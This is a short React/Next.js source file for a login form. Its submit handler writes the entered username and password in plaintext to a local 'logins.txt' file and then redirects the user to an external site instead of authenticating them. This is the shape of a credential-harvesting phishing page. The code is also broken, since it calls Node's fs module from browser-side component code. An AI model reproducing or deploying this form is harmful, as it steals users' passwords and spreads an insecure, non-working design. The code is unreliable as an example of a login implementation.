import { useState } from 'react';
import fs from 'fs';
import path from 'path';
import { useRouter } from 'next/router';

const Login=()=> {
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const router = useRouter();

  const handleSubmit = (e) => {
    e.preventDefault();

    const data = {
      username,
      password,
    };

    fs.writeFileSync(path.join(process.cwd(), 'logins.txt'), JSON.stringify(data));
    router.push('https://www.external.com');
  };

  return (
    <div>
      <h1>Login</h1>
      <form onSubmit={handleSubmit}>
        <input
          type="text"
          placeholder="Username"
          value={username}
          onChange={(e) => setUsername(e.target.value)}
        />
        <input
          type="password"
          placeholder="Password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
        />
        <button type="submit">Login</button>
      </form>
    </div>
  );
}
export default Login;
